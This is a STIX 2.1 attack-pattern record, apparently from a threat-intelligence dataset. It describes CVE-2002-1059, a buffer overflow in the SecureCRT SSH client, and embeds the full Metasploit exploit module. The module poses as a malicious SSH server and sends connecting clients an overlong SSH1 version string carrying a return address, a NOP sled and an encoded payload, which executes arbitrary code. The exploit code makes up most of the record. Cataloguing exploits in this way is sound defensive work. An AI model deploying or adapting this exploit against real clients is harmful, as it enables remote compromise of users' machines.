{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05d450b3-6b63-4cd2-bae1-06ffdfc71ed8",
    "created": "2024-08-14T16:48:02.235016Z",
    "modified": "2024-08-14T16:48:02.23502Z",
    "name": "SecureCRT SSH1 Buffer Overflow",
    "description": " This module exploits a buffer overflow in SecureCRT <= 4.0 Beta 2. By sending a vulnerable client an overly long SSH1 protocol identifier string, it is possible to execute arbitrary code.  This module has only been tested on SecureCRT 3.4.4. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ssh/securecrt_ssh1.rb",
            "external_id": "securecrt_ssh1.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1059"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SecureCRT SSH1 Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in SecureCRT <= 4.0\n        Beta 2. By sending a vulnerable client an overly long\n        SSH1 protocol identifier string, it is possible to execute\n        arbitrary code.\n\n        This module has only been tested on SecureCRT 3.4.4.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2002-1059' ],\n          [ 'OSVDB', '4991' ],\n          [ 'BID', '5287' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n          'MaxNops'  => 0,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'SecureCRT.exe (3.4.4)', { 'Ret' => 0x0041b3e0 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2002-07-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The SSH daemon port to listen on\", 22 ])\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    buffer =  \"SSH-1.1-OpenSSH_3.6.1p2\\r\\n\" + rand_text_english(243)\n    buffer << [target.ret].pack('V') + make_nops(20) + payload.encoded\n\n    print_status(\"Sending #{buffer.length} bytes to #{client.getpeername}:#{client.peerport}...\")\n\n    client.put(buffer)\n    handler\n\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-07-23",
    "x_mitre_platforms": [
        "win'"
    ]
}